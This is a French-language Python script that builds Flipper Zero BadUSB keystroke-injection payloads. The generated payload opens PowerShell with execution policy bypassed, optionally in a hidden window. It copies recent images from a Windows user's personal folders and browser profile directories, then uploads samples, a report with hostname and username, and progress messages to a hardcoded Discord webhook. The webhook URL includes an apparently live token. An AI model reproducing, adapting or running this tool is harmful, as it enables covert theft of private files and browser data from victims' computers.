#!/usr/bin/env python3
"""
Flipper Zero BadUSB - Générateur de Payload Webhook
==================================================
Description: Génération de payloads personnalisés avec Discord webhook
Auteur: Plume-Paopedia  
Version: 2.0
Usage: python webhook_generator.py
"""

import os
import sys
import json
from datetime import datetime
from pathlib import Path

# Configuration
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1416477793264603249/dxrIG93WCYqELVdSEXtQ7aqioc3MglF1m06Kee476so3zrsRllBg"
PAYLOADS_DIR = Path("../payloads")
TEMPLATES_DIR = Path("templates")

def get_user_input(prompt, default=None):
    """Récupère une entrée utilisateur avec valeur par défaut."""
    if default:
        user_input = input(f"{prompt} [{default}]: ").strip()
        return user_input if user_input else default
    return input(f"{prompt}: ").strip()

def get_yes_no(prompt, default="n"):
    """Récupère une réponse oui/non."""
    response = get_user_input(prompt + " (o/n)", default).lower()
    return response.startswith('o') or response.startswith('y')

def generate_webhook_functions():
    """Génère les fonctions PowerShell pour webhook Discord."""
    return f'''# Configuration webhook Discord
$webhookUrl = "{WEBHOOK_URL}"

# Fonction d'envoi Discord optimisée
function Send-DiscordMessage {{
  param([string]$message, [string]$file = $null, [switch]$isImage)
  try {{
    if ($file -and (Test-Path $file) -and (Get-Item $file).Length -lt 8MB) {{
      $boundary = [System.Guid]::NewGuid().ToString()
      $headers = @{{'Content-Type' = "multipart/form-data; boundary=$boundary"}}
      $fileContent = [System.IO.File]::ReadAllBytes($file)
      $fileName = [System.IO.Path]::GetFileName($file)
      $contentType = if($isImage) {{"image/jpeg"}} else {{"text/plain"}}
      
      $body = "--$boundary`r`nContent-Disposition: form-data; name=`"content`"`r`n`r`n$message`r`n"
      $body += "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`n"
      $body += "Content-Type: $contentType`r`n`r`n"
      
      $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
      $endBoundary = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
      $fullBody = $bodyBytes + $fileContent + $endBoundary
      
      Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $fullBody -Headers $headers
      Start-Sleep 1  # Anti rate-limit
    }} else {{
      $payload = @{{content = $message}} | ConvertTo-Json
      Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
      Start-Sleep 0.5
    }}
  }} catch {{
    Write-Host "Erreur webhook: $($_.Exception.Message)" -ForegroundColor Red
    # Log local en cas d'échec webhook
    "$message`n" | Out-File -Append -FilePath "$env:TEMP\\discord_webhook_errors.log" -ErrorAction SilentlyContinue
  }}
}}'''

def generate_payload_header(config):
    """Génère l'en-tête du payload."""
    return f'''REM ================================================================
REM Flipper Zero BadUSB - {config['name']}
REM ================================================================
REM Nom: {config['name']}
REM Description: {config['description']}
REM Cible: Windows 7/8/10/11 (PowerShell 2.0+)
REM Auteur: {config['author']}
REM Version: {config['version']}
REM Généré: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
REM Durée estimée: {config['estimated_duration']} minutes
REM Privilèges: Utilisateur standard
REM Webhook: Discord intégré
REM ================================================================

DEFAULT_DELAY {config['default_delay']}'''

def generate_extraction_logic(config):
    """Génère la logique d'extraction personnalisée."""
    locations = []
    if config['include_pictures']: locations.append("'$env:USERPROFILE\\Pictures'")
    if config['include_desktop']: locations.append("'$env:USERPROFILE\\Desktop'")
    if config['include_documents']: locations.append("'$env:USERPROFILE\\Documents'")
    if config['include_downloads']: locations.append("'$env:USERPROFILE\\Downloads'")
    if config['include_onedrive']: locations.append("'$env:USERPROFILE\\OneDrive'")
    if config['include_cache']:
        locations.extend([
            "'$env:LOCALAPPDATA\\Google\\Chrome\\User Data'",
            "'$env:APPDATA\\Mozilla\\Firefox\\Profiles'",
            "'$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data'"
        ])
    
    extensions = ["'*.jpg'", "'*.jpeg'", "'*.png'", "'*.gif'", "'*.bmp'", "'*.webp'"]
    if config['include_raw']: extensions.extend(["'*.raw'", "'*.cr2'", "'*.nef'", "'*.arw'"])
    if config['include_professional']: extensions.extend(["'*.psd'", "'*.ai'", "'*.tiff'", "'*.tif'"])
    
    return f'''# Configuration extraction
$basePath = "$env:USERPROFILE\\Desktop\\{config['folder_name']}_$(Get-Date -Format 'yyyyMMddHHmmss')"
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath

$dateLimit = (Get-Date).AddDays(-{config['max_age_days']})
$maxSize = {config['max_size_mb']}MB
$minSize = {config['min_size_kb']}KB
$extensions = @({', '.join(extensions)})
$locations = @(
  {',\\n  '.join(locations)}
)

$stats = @{{
  processed = 0; extracted = 0; duplicates = 0; errors = 0; totalSize = 0
}}
$errors = @()
$extractedFiles = @()'''

def generate_progress_reporting(config):
    """Génère le code de rapport de progression."""
    if not config['progress_reports']:
        return ""
    
    return '''
# Fonction de rapport de progression
function Report-Progress {
  param($current, $total, $phase)
  if ($current % 25 -eq 0 -or $current -eq $total) {
    $percentage = if($total -gt 0) {[math]::Round(($current/$total)*100,1)} else {0}
    $message = "📊 **Progression $phase**: $current/$total ($percentage%) | Taille: $([math]::Round($stats.totalSize/1MB,1))MB"
    Send-DiscordMessage $message
    Write-Host "📊 $message" -ForegroundColor Cyan
  }
}'''

def generate_main_extraction():
    """Génère la boucle principale d'extraction."""
    return '''# Processus d'extraction principal
Write-Host '🚀 Démarrage extraction avec webhook...' -ForegroundColor Green
Send-DiscordMessage "🚀 **Extraction démarrée** sur **$(hostname)**\\n⏰ Début: $(Get-Date -Format 'HH:mm:ss')"

foreach ($location in $locations) {
  if (-not (Test-Path $location)) {
    $errors += "Dossier introuvable: $location"
    continue
  }
  
  Write-Host "📂 Scan: $location" -ForegroundColor Yellow
  
  foreach ($ext in $extensions) {
    try {
      $files = Get-ChildItem -Path $location -Filter $ext -Recurse -ErrorAction SilentlyContinue |
        Where-Object { 
          $_.LastWriteTime -gt $dateLimit -and 
          $_.Length -ge $minSize -and 
          $_.Length -le $maxSize -and 
          -not $_.PSIsContainer 
        }
      
      foreach ($file in $files) {
        try {
          $stats.processed++
          
          # Génération nom unique
          $timestamp = $file.LastWriteTime.ToString('MMdd_HHmm')
          $sizeKB = [math]::Round($file.Length/1KB)
          $newName = "img_$timestamp`_$sizeKB`KB_$($stats.extracted)" + $file.Extension
          
          Copy-Item $file.FullName -Destination ".\\$newName" -ErrorAction Stop
          $extractedFiles += $newName
          $stats.extracted++
          $stats.totalSize += $file.Length
          
          # Rapport de progression
          if ($config['progress_reports'] -and $stats.extracted % 25 -eq 0) {
            Report-Progress $stats.extracted $stats.processed "Extraction"
          }
          
        } catch {
          $stats.errors++
          $errors += "Erreur copie $($file.FullName): $($_.Exception.Message)"
        }
      }
    } catch {
      $errors += "Erreur scan $location avec $ext: $($_.Exception.Message)"
    }
  }
}'''

def generate_final_report():
    """Génère le rapport final et l'envoi Discord."""
    return '''# Génération rapport final
$duration = (Get-Date) - $startTime
$reportData = @(
  "════════════════════════════════════════════",
  "RAPPORT EXTRACTION PERSONNALISÉE",
  "════════════════════════════════════════════",
  "Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')",
  "Machine: $(hostname)",
  "Utilisateur: $env:USERNAME",
  "Durée: $($duration.Minutes)min $($duration.Seconds)s",
  "",
  "STATISTIQUES:",
  "• Images extraites: $($stats.extracted)",
  "• Fichiers analysés: $($stats.processed)", 
  "• Erreurs: $($stats.errors)",
  "• Taille totale: $([math]::Round($stats.totalSize/1MB,2)) MB",
  ""
)

# Ajout des erreurs si présentes
if ($errors.Count -gt 0) {
  $reportData += "ERREURS DÉTAILLÉES:"
  foreach ($error in $errors) { $reportData += "• $error" }
  $reportData += ""
}

# Sauvegarde rapport local
$reportFile = ".\\RAPPORT_EXTRACTION.txt"
$reportData | Out-File -FilePath $reportFile -Encoding UTF8

# Envoi résumé Discord
$summary = "🎯 **Extraction personnalisée terminée!**\\n\\n"
$summary += "📊 **Résultats:**\\n"
$summary += "• **Machine:** $(hostname)\\n"
$summary += "• **Images:** $($stats.extracted)/$($stats.processed)\\n"
$summary += "• **Taille:** $([math]::Round($stats.totalSize/1MB,2)) MB\\n"
$summary += "• **Durée:** $($duration.Minutes)min $($duration.Seconds)s\\n"
if ($errors.Count -gt 0) {
  $summary += "• **⚠️ Erreurs:** $($errors.Count)"
}

Send-DiscordMessage $summary

# Envoi du rapport détaillé
if (Test-Path $reportFile) {
  Send-DiscordMessage "📄 **Rapport détaillé ci-joint**" $reportFile
}

# Envoi échantillon d'images
if ($stats.extracted -gt 0) {
  $sampleCount = [Math]::Min(3, $extractedFiles.Count)
  Send-DiscordMessage "🖼️ **Échantillon des images** ($sampleCount/$($stats.extracted)):"
  for ($i = 0; $i -lt $sampleCount; $i++) {
    $sampleFile = $extractedFiles[$i]
    if ((Get-Item $sampleFile).Length -lt 7MB) {
      Send-DiscordMessage "Image $($i+1)/$sampleCount" $sampleFile -isImage
      Start-Sleep 2
    }
  }
}'''

def create_custom_payload():
    """Interface interactive pour créer un payload personnalisé."""
    print("🔧 Générateur de Payload Webhook Discord")
    print("=" * 45)
    print()
    
    # Collecte des informations
    config = {}
    config['name'] = get_user_input("Nom du payload", "Extraction_Personnalisee")
    config['author'] = get_user_input("Nom de l'auteur", "Utilisateur")
    config['version'] = get_user_input("Version", "1.0") 
    config['description'] = get_user_input("Description", "Extraction d'images personnalisée avec webhook Discord")
    
    print("\n📁 Configuration des emplacements:")
    config['include_pictures'] = get_yes_no("Inclure le dossier Pictures", "o")
    config['include_desktop'] = get_yes_no("Inclure le Bureau", "o")
    config['include_documents'] = get_yes_no("Inclure Documents", "o") 
    config['include_downloads'] = get_yes_no("Inclure Téléchargements", "o")
    config['include_onedrive'] = get_yes_no("Inclure OneDrive", "n")
    config['include_cache'] = get_yes_no("Inclure caches navigateurs", "o")
    
    print("\n🖼️ Configuration des types d'images:")
    config['include_raw'] = get_yes_no("Inclure formats RAW (photographes)", "n")
    config['include_professional'] = get_yes_no("Inclure PSD/AI (designers)", "n")
    
    print("\n⚙️ Configuration des filtres:")
    config['max_age_days'] = int(get_user_input("Âge maximum des fichiers (jours)", "30"))
    config['max_size_mb'] = int(get_user_input("Taille maximum par fichier (MB)", "25"))
    config['min_size_kb'] = int(get_user_input("Taille minimum par fichier (KB)", "10"))
    
    print("\n🔧 Configuration avancée:")
    config['default_delay'] = int(get_user_input("Délai par défaut (ms)", "300"))
    config['folder_name'] = get_user_input("Nom du dossier de destination", config['name'])
    config['progress_reports'] = get_yes_no("Rapports de progression Discord", "o")
    config['stealth_mode'] = get_yes_no("Mode furtif (fenêtre cachée)", "n")
    
    # Estimation durée
    complexity = (
        (1 if config['include_pictures'] else 0) +
        (1 if config['include_desktop'] else 0) + 
        (1 if config['include_documents'] else 0) +
        (1 if config['include_downloads'] else 0) +
        (2 if config['include_cache'] else 0) +
        (1 if config['include_onedrive'] else 0)
    )
    config['estimated_duration'] = max(2, complexity * 3)
    
    # Génération du payload
    print(f"\n🔨 Génération du payload '{config['name']}'...")
    
    payload_content = []
    
    # En-tête
    payload_content.append(generate_payload_header(config))
    payload_content.append("")
    
    # Ouverture PowerShell
    if config['stealth_mode']:
        payload_content.extend([
            "REM Ouverture PowerShell furtive",
            "GUI r",
            "DELAY 500",
            "STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass",
            "ENTER",
            "DELAY 1500"
        ])
    else:
        payload_content.extend([
            "REM Ouverture PowerShell normale",
            "GUI r", 
            "DELAY 500",
            "STRING powershell -ExecutionPolicy Bypass",
            "ENTER",
            "DELAY 1200"
        ])
    
    payload_content.append("")
    payload_content.append("STRING try {")
    payload_content.append("ENTER")
    payload_content.append("DELAY 200")
    payload_content.append("")
    
    # Fonctions webhook
    webhook_functions = generate_webhook_functions()
    for line in webhook_functions.split('\n'):
        if line.strip():
            payload_content.append(f"STRING {line}")
            payload_content.append("ENTER")
    payload_content.append("DELAY 400")
    payload_content.append("")
    
    # Initialisation
    payload_content.append("STRING $startTime = Get-Date")
    payload_content.append("ENTER")
    
    # Configuration extraction  
    extraction_config = generate_extraction_logic(config)
    for line in extraction_config.split('\n'):
        if line.strip():
            payload_content.append(f"STRING {line}")
            payload_content.append("ENTER")
    payload_content.append("DELAY 300")
    payload_content.append("")
    
    # Rapport de progression
    if config['progress_reports']:
        progress_code = generate_progress_reporting(config)
        for line in progress_code.split('\n'):
            if line.strip():
                payload_content.append(f"STRING {line}")
                payload_content.append("ENTER")
        payload_content.append("DELAY 200")
        payload_content.append("")
    
    # Extraction principale
    main_extraction = generate_main_extraction()
    for line in main_extraction.split('\n'):
        if line.strip():
            payload_content.append(f"STRING {line}")
            payload_content.append("ENTER")
    payload_content.append("DELAY 500")
    payload_content.append("")
    
    # Rapport final
    final_report = generate_final_report()
    for line in final_report.split('\n'):
        if line.strip():
            payload_content.append(f"STRING {line}")
            payload_content.append("ENTER")
    payload_content.append("DELAY 500")
    payload_content.append("")
    
    # Gestion d'erreurs et finalisation
    payload_content.extend([
        "STRING } catch {",
        "ENTER",
        f"STRING   $errorMsg = \"❌ **ERREUR {config['name'].upper()}**: $($_.Exception.Message) sur $(hostname)\"",
        "ENTER",
        "STRING   try {",
        "ENTER",
        f"STRING     Invoke-RestMethod -Uri \"{WEBHOOK_URL}\" -Method Post -Body (@{{content=$errorMsg}}|ConvertTo-Json) -ContentType 'application/json'",
        "ENTER",
        "STRING   } catch { }",
        "ENTER", 
        "STRING   Write-Host $errorMsg -ForegroundColor Red",
        "ENTER",
        "STRING }",
        "ENTER",
        "DELAY 300",
        "",
        "STRING if ($stats.extracted -gt 0) { explorer . }",
        "ENTER",
        "STRING Write-Host \"Appuyez sur Entrée pour fermer...\"",
        "ENTER", 
        "STRING Read-Host",
        "ENTER",
        "STRING exit",
        "ENTER"
    ])
    
    # Sauvegarde
    PAYLOADS_DIR.mkdir(exist_ok=True)
    filename = f"{config['name'].replace(' ', '_').lower()}.txt"
    filepath = PAYLOADS_DIR / filename
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write('\n'.join(payload_content))
    
    print(f"✅ Payload généré avec succès!")
    print(f"📁 Fichier: {filepath}")
    print(f"📏 Taille: {len('\n'.join(payload_content))} caractères")
    print(f"📊 Lignes: {len(payload_content)}")
    print(f"⏱️ Durée estimée: {config['estimated_duration']} minutes")
    print()
    print("🚀 Le payload est prêt à être utilisé sur votre Flipper Zero!")
    print("🔗 Il enverra automatiquement les résultats sur Discord.")

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--help":
        print("Générateur de Payload Webhook Discord")
        print("Usage: python webhook_generator.py")
        print("Interface interactive pour créer des payloads personnalisés")
        return
    
    try:
        create_custom_payload()
    except KeyboardInterrupt:
        print("\n\n❌ Génération interrompue par l'utilisateur.")
    except Exception as e:
        print(f"\n❌ Erreur lors de la génération: {e}")

if __name__ == "__main__":
    main()